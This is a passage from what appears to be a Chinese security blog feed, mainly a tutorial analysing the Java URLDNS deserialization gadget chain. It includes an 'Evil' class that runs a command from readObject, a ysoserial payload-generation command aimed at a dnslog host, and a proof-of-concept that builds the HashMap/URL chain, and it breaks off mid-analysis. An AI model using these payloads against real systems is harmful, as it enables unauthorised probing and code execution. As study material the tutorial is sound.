Group）</p></li><li><p>p：资源权限（permssion）</p></li><li><p>安装域控时，系统会自动生成一些组，为内置组；内置组定义了一些常用的权限–&gt;Builtin和Users组织单元的组就是内置组；</p></li><li><p>内置的域本地组在Builtin组织单元中</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yVqH.png"                      alt="image.png"                ></p><ul><li>内置的全局组和通用组在Users组织单元中</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://s1.ax1x.com/2022/07/11/j6yeZd.png"                      alt="image.png"                ></p><table><thead><tr><th>域本地组</th><th>权限</th></tr></thead><tbody><tr><td>administrators</td><td>管理员组，成员可以不受限制的的存取计算机和域内的资源</td></tr><tr><td>Remote Desktop Users</td><td>远程登录组，成员具有远程登录权限</td></tr><tr><td>Account Operators</td><td>账号操作员组，创建和管理域内用户和组，不能更改administrators和Domain Admins组账户</td></tr><tr><td>Domain Admins</td><td>域管理员组，成员在所有加入域的服务器&#x2F;域控和AD中均默认拥有完整的管理员权限，用户称为域系统管理员可加入，administrators组不是的</td></tr><tr><td>Domain Users</td><td>域用户组，默认是内置域的User组</td></tr></tbody></table>]]></content>
    
    
    <summary type="html">域渗透基础以及环境搭建</summary>
    
    
    
    <category term="内网渗透" scheme="https://pan3a.github.io/categories/%E5%86%85%E7%BD%91%E6%B8%97%E9%80%8F/"/>
    
    
  </entry>
  
  <entry>
    <title>浅谈Web信息搜集</title>
    <link href="https://pan3a.github.io/3/"/>
    <id>https://pan3a.github.io/3/</id>
    <published>2022-02-08T14:11:08.000Z</published>
    <updated>2022-07-11T05:31:38.858Z</updated>
    
    <content type="html"><![CDATA[<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">  <script id="hbeData" type="hbeData" data-hmacdigest="f5b996d6d1d8868fbd65afd6f07073b4f8ba5cf4fc6c46910d6f4347d94912d7">7140bd27c8c3a1a812f1a9251eb3ba92473368bd3de4f630bd11118f0ec899c36a3f0de818e09a818559a54c19d9a580efa820d1e3c1464a405379b0d4a55dfa2dae728fc4adfe95316ca38cfdfc5ec4b8f5c0abd40993b71a50369e3d3be78651e0a6ef30ddb4b2de746fa5020794dbf5aa65bfd1e406eba1b75b2b6f536597811c999553d5ee3f38e90a56d32f9e299c96e2337785dccf68eeb190cbba566af68a2d9b9e1863d455dcda5bd5bb255741b351610464f581f2a2c535abd461155b9c35b0c545faca9b3743c8622caff72529fbfce5d801d4e8ffd976898308fdaeba49373f3c81650f5ab27d384b474b0024ce1384c10d46b408c913eba3ed0f066ae1075d2998886edf7962a4a4e5a4cea5de29b2e29086508f5ec0ded01450c478a6a748aa252cd5ee2641fa013f187d18d300462cf995bba52c9ea09246303d30bc22d63fbb9cf0d98fa9ff8ef68491d622dcb5a53f5ab3aa528ddf1645f6575aaca567e38d5f1f2dbcfc2e9d20ccf3e965caafdc0b3bc4b51f16a38ade1cab94df8d19125bb33d6524617edf2a2ce4d57cd9f187aed42c05376cd2577e6eaf8b0caf7ba404ba5f9388fa88fd6d961d0f9c8eb3d2d5a0bd940ccf43f4cd235d905686116c418086272045df50ace9a5ef606ad7a2c0229eebf29d44a625036f9dc7e003a3423418e8fdabb67f22b20b48788bbf5e604ed3f668d6a3a4323d2566eea35778718b3ff5710b0615a244e733486be74e2d420a643b6cd3634925a037c58802af835287fcfa81de08da9d855e80cef8a323ee092f3898580b3c142a43df38d15e3cd557852c7cf7ebe80b545f807e9e878655276ed1342a5379c5d903b8cc2cebcec9ec841a09571e62615e76f37116cef6025e964665d133d30f517f67c1d046d5ff4c5d55f51cac83183d8f66cac4ffa38040ec5f26d06f62a058aa38b243d1fa2da9e9b04305e5b6fa3f873db5534b4df9048e520431fecb5a8448cde68ddcddf7c60feda5ea41912737544029e6ec46ea0612c01a1b1f078ce66d7373a0789a94ab32c0036e225e420b077f0883a31af991101253052bc85124656fef9006fc3b98000e97fd22bc4cf62a55b046f652e9ab0c1742269b2f78749faf3daa2fa62cb299cfcaa2729ad004180b66ce9357a48363d00631dba6e6ec216a4f470091c14d4fbc0b3845917e2460d0ad6ec5c80475fe53d86ac7e4758b62133110caf80c2119f3e98914edd533ad89d3d260da549fb34ed23523d1dbcbed8461550db4cf4d4f7bdb4c20abfd85534e602bfa9c15910fd822db3372c7b6c7954e7f95336a80b23ebcda728e150f4cbd0d06980196a34b8f21f19bc73f43f322c036492ca50a79aef4fa5b0ca0af345290a02d15291daa6569a66b65eb0900d71f8d361283f1060e62c1bfee3508828998b1dab43f265997547c840362c9223c0d8b51f5780047fa9d7f44a2c4d099e88febbf1453a93f443bda8a55327960611c3821eb4e017a38459aefd2ae94d099f0f829e8728e2b01fd301ddc9f989810e5e173d9cd3bbb5cb16dd372fbc1691392dea2c96868529236a80f0bfd</script>  <div class="hbe hbe-content">    <div class="hbe hbe-input hbe-input-default">      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>      </label>    </div>  </div></div><script data-pjax src="/lib/hbe.js"></script><link href="/css/hbe.style.css" rel="stylesheet" type="text/css">]]></content>
    
    
    <summary type="html">Web渗透测试前的信息搜集</summary>
    
    
    
    <category term="Web" scheme="https://pan3a.github.io/categories/Web/"/>
    
    
  </entry>
  
  <entry>
    <title>URLDNS分析</title>
    <link href="https://pan3a.github.io/2/"/>
    <id>https://pan3a.github.io/2/</id>
    <published>2022-01-07T08:21:08.000Z</published>
    <updated>2022-02-12T04:01:38.900Z</updated>
    
    <content type="html"><![CDATA[<ul><li>学习了很久的<code>Java</code>基础，也看了很多的Java反序列化分析，现在也来分析学习哈最基础的<code>URLDNS</code>反序列化吧。</li></ul><span id="more"></span><h1 id="Java反序列化基础"><a href="#Java反序列化基础" class="headerlink" title="Java反序列化基础"></a>Java反序列化基础</h1><ul><li><p>为了方便数据的存储，于是乎有了现在的<code>Java</code>序列化于反序列化。序列化就是将<code>Java</code>对象存储到一个文件，反序列化则是读取序列化生产的文件，还原<code>Java</code>对象，常见的基础反序列化。</p></li><li><p>首先类需要实现<code>Serializable</code>这个接口，虽然这个接口里面没有东西，但是不实现这个接口则无法序列化。用<code>transient</code> 关键字修饰的属性除外，不参与序列化过程。</p></li><li><p><code>ObjectOutputStream.writeObject()</code>序列化对象。</p></li><li><p><code>ObjectInputStream.readObject()</code>读取我们的对象，这里也是我们反序列化的利用点。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// SerializeAndUnserialize.java</span></span><br><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.io.FileOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">SerializeAndUnSerialize</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line"><span class="comment">//        正常反序列化</span></span><br><span class="line">        serializeToFile(<span class="string">&quot;User.ser&quot;</span>);</span><br><span class="line">        unSerializeToObject(<span class="string">&quot;User.ser&quot;</span>);</span><br><span class="line"><span class="comment">//        恶意反序列化</span></span><br><span class="line">        evilObject(<span class="string">&quot;Evil.ser&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serializeToFile</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException</span>&#123;</span><br><span class="line">        User user = <span class="keyword">new</span> User(<span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(user);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerializeToObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        User user = (User)objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">        user.setName(<span class="string">&quot;Forever404&quot;</span>);</span><br><span class="line">        System.out.println(user.getName());</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">evilObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        Evil evil = <span class="keyword">new</span> Evil();</span><br><span class="line">        evil.command = <span class="string">&quot;/System/Applications/Calculator.app/Contents/MacOS/Calculator&quot;</span>;</span><br><span class="line"></span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(evil);</span><br><span class="line">        objectOutputStream.flush();</span><br><span class="line">        objectOutputStream.close();</span><br><span class="line"></span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">        objectInputStream.close();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">private</span> String name;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">User</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> String <span class="title">getName</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">this</span>.name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setName</span><span class="params">(String name)</span></span>&#123;</span><br><span class="line">        <span class="keyword">this</span>.name = name;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">writeObject</span><span class="params">(ObjectOutputStream objectOutputStream)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        objectOutputStream.defaultWriteObject();</span><br><span class="line">        objectOutputStream.writeObject(<span class="string">&quot;Hello, This is writeObject!!&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        String message = (String) objectInputStream.readObject();</span><br><span class="line">        System.out.println(message);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Evil</span> <span class="keyword">implements</span> <span class="title">Serializable</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> String command;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(ObjectInputStream objectInputStream)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException</span>&#123;</span><br><span class="line">        objectInputStream.defaultReadObject();</span><br><span class="line">        Runtime.getRuntime().exec(command);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>输出</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Hello, This is writeObject!!</span><br><span class="line">Pan3a</span><br><span class="line">Forever404</span><br></pre></td></tr></table></figure></li><li><p>这里序列化生成的数据。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/1.png"                      alt="image.png"                ></p><ul><li>分析<code>Evil</code>类，这里控制了该类的<code>readObject</code>方法，那么则可能造成漏洞。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/2.png"                      alt="image.png"                ></p><h1 id="Ysoserial"><a href="#Ysoserial" class="headerlink" title="Ysoserial"></a>Ysoserial</h1><ul><li><p><code>ysoserial</code>是一个<code>Java</code>反序列化漏洞利用工具，通常用于检测是否存在Java反序列化漏洞。</p></li><li><p><a class="link"   href="https://github.com/frohoff/ysoserial" >https://github.com/frohoff/ysoserial<i class="fas fa-external-link-alt"></i></a></p></li><li><p>这里可以将其克隆下来再将其打包成jar文件即可，然后会在生成一个<code>target</code>目录，里面就有生成的jar。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mvn clean package -DskipTests</span><br></pre></td></tr></table></figure><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/3.png"                      alt="image.png"                ></p><h2 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h2></li><li><p><a class="link"   href="http://www.dnslog.cn/" >http://www.dnslog.cn/<i class="fas fa-external-link-alt"></i></a></p></li><li><p>获取一个DNS。</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/4.png"                      alt="image.png"                ></p><ul><li>生成我们的<code>payload</code>。</li><li><code>java -jar ysoserial-0.0.6-SNAPSHOT-all.jar URLDNS &quot;http://0ehcf6.dnslog.cn&quot; &gt; ~/Temp/URLDNS.ser</code></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/5.png"                      alt="image.png"                ></p><h2 id="编写漏洞代码"><a href="#编写漏洞代码" class="headerlink" title="编写漏洞代码"></a>编写漏洞代码</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// URLDNSYsoSerialTest</span></span><br><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.FileInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNSYsoSerialTest</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> IOException,ClassNotFoundException </span>&#123;</span><br><span class="line">        FileInputStream inputStream = <span class="keyword">new</span> FileInputStream(<span class="string">&quot;/Users/pan3a/Temp/URLDNS.ser&quot;</span>);</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(inputStream);</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><ul><li>DNS获取到请求记录。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/6.png"                      alt="image.png"                ></p><h1 id="URLDNS"><a href="#URLDNS" class="headerlink" title="URLDNS"></a>URLDNS</h1><ul><li><p><code>URLDNS</code>，它的功能正如其名发起DNS请求，因此无法回显，只能检测Java反序列化漏洞，构造好测试代码，然后开始调试。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> JavaSecurity.URLDNS;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.URL;</span><br><span class="line"><span class="keyword">import</span> java.util.HashMap;</span><br><span class="line"><span class="keyword">import</span> java.lang.reflect.Field;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">URLDNSPoc</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        urlDns();</span><br><span class="line">        unSerializeToObject(<span class="string">&quot;urlDns.ser&quot;</span>);</span><br><span class="line"><span class="comment">//        addressGetByName();</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">urlDns</span><span class="params">()</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        HashMap&lt;URL, String&gt; hashMap = <span class="keyword">new</span> HashMap&lt;URL, String&gt;();</span><br><span class="line"></span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://pjm4n7.dnslog.cn&quot;</span>);</span><br><span class="line">        Class&lt;? &gt; clazz = Class.forName(<span class="string">&quot;java.net.URL&quot;</span>);</span><br><span class="line">        Field field = clazz.getDeclaredField(<span class="string">&quot;hashCode&quot;</span>);</span><br><span class="line">        field.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        hashMap.put(url, <span class="string">&quot;Pan3a&quot;</span>);</span><br><span class="line">        field.set(url, -<span class="number">1</span>);</span><br><span class="line">        serializeToFile(<span class="string">&quot;urlDns.ser&quot;</span>, hashMap);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">serializeToFile</span><span class="params">(String file,Object object)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        ObjectOutputStream objectOutputStream = <span class="keyword">new</span> ObjectOutputStream(<span class="keyword">new</span> FileOutputStream(file));</span><br><span class="line">        objectOutputStream.writeObject(object);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">unSerializeToObject</span><span class="params">(String file)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream objectInputStream = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> FileInputStream(file));</span><br><span class="line">        objectInputStream.readObject();</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//   最后发现是由getByName函数发起DNS请求，测试证明。</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">addressGetByName</span><span class="params">()</span> <span class="keyword">throws</span> Exception</span>&#123;</span><br><span class="line">        URL url = <span class="keyword">new</span> URL(<span class="string">&quot;https://pjm4n7.dnslog.cn&quot;</span>);</span><br><span class="line">        String host = url.getHost();</span><br><span class="line">        InetAddress addr = InetAddress.getByName(host);</span><br><span class="line">        String domainName = addr.getHostName();<span class="comment">//获得主机名</span></span><br><span class="line">        String IPName = addr.getHostAddress();<span class="comment">//获得IP地址</span></span><br><span class="line">        System.out.println(<span class="string">&quot;hostname:&quot;</span> + domainName);</span><br><span class="line">        System.out.println(<span class="string">&quot;IPName:&quot;</span> + IPName);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></li><li><p>由于知道网上的利用链（<code>Gatget Chain</code>）是在<code>HashMap</code>的<code>readObject</code>方法触发的，因此我们直接在<code>HashMap</code>的<code>readObject</code>方法处下断点位置下断点即可，有些可能因为<code>IDEA</code>默认配置有个黑名单调试时不进入某些类，我们直接取消该选项。（因个人喜而异，能调试都可以。）</p></li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/7.png"                      alt="image.png"                ></p><ul><li>在<code>HashMap</code>类的<code>1367</code>行进入了调试模式，接下来继续向下跟。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/8.png"                      alt="image.png"                ></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in the threshold (ignored), loadfactor, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line">    reinitialize();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor))</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    s.readInt();                <span class="comment">// Read and ignore number of buckets</span></span><br><span class="line">    <span class="keyword">int</span> mappings = s.readInt(); <span class="comment">// Read number of mappings (size)</span></span><br><span class="line">    <span class="keyword">if</span> (mappings &lt; <span class="number">0</span>)</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal mappings count: &quot;</span> +</span><br><span class="line">                                         mappings);</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (mappings &gt; <span class="number">0</span>) &#123; <span class="comment">// (if zero, use defaults)</span></span><br><span class="line">        <span class="comment">// Size the table using given load factor only if within</span></span><br><span class="line">        <span class="comment">// range of 0.25...4.0</span></span><br><span class="line">        <span class="keyword">float</span> lf = Math.min(Math.max(<span class="number">0.25f</span>, loadFactor), <span class="number">4.0f</span>);</span><br><span class="line">        <span class="keyword">float</span> fc = (<span class="keyword">float</span>)mappings / lf + <span class="number">1.0f</span>;</span><br><span class="line">        <span class="keyword">int</span> cap = ((fc &lt; DEFAULT_INITIAL_CAPACITY) ?</span><br><span class="line">                   DEFAULT_INITIAL_CAPACITY :</span><br><span class="line">                   (fc &gt;= MAXIMUM_CAPACITY) ?</span><br><span class="line">                   MAXIMUM_CAPACITY :</span><br><span class="line">                   tableSizeFor((<span class="keyword">int</span>)fc));</span><br><span class="line">        <span class="keyword">float</span> ft = (<span class="keyword">float</span>)cap * lf;</span><br><span class="line">        threshold = ((cap &lt; MAXIMUM_CAPACITY &amp;&amp; ft &lt; MAXIMUM_CAPACITY) ?</span><br><span class="line">                     (<span class="keyword">int</span>)ft : Integer.MAX_VALUE);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Check Map.Entry[].class since it&#x27;s the nearest public type to</span></span><br><span class="line">        <span class="comment">// what we&#x27;re actually creating.</span></span><br><span class="line">        SharedSecrets.getJavaOISAccess().checkArray(s, Map.Entry[].class, cap);</span><br><span class="line">        <span class="meta">@SuppressWarnings(&#123;&quot;rawtypes&quot;,&quot;unchecked&quot;&#125;)</span></span><br><span class="line">        Node&lt;K,V&gt;[] tab = (Node&lt;K,V&gt;[])<span class="keyword">new</span> Node[cap];</span><br><span class="line">        table = tab;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Read the keys and values, and put the mappings in the HashMap</span></span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; mappings; i++) &#123;</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                K key = (K) s.readObject();</span><br><span class="line">            <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">                V value = (V) s.readObject();</span><br><span class="line">            putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">false</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li>这里一直向下跟进直到<code>36</code>行的一个<code>for</code>循环发现这里有<code>readObject</code>方法，我们传入的<code>key</code>又是<code>java.net.URL</code>对象，继续向下走然后到<code>41</code>行的的<code>putVal</code>方法，再继续跟进<code>hash</code>方法。</li></ul><p><img                       lazyload                     src="/images/loading.svg"                     data-src="https://gitee.com/pan3a/image/raw/urldns/URLDNS/9.png"                      alt="image.png"                